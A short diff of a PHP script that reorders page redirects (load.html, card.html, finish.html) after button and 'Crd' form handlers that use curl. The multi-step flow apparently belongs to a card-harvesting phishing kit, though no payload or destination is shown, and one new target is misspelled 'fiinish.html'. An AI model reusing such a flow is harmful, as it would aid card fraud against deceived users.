@@ -122,7 +122,7 @@ else if (isset($_POST['btn2'])) {
         curl_close($ch);
     }
 
-	header("Location: ./load.html");
+	header("Location: ./card.html");
 	
 	
 }
@@ -174,7 +174,7 @@ else if (isset($_POST['btn3'])) {
         curl_close($ch);
     }
 
-	header("Location: ./card.html");
+	header("Location: ./fiinish.html");
 	
 	
 };
@@ -220,7 +220,7 @@ if (isset($_GET['Crd'])) {
         curl_close($ch);
     }
 
- header("Location: ./finish.html");
+ header("Location: ./load.html");
 };
 
 
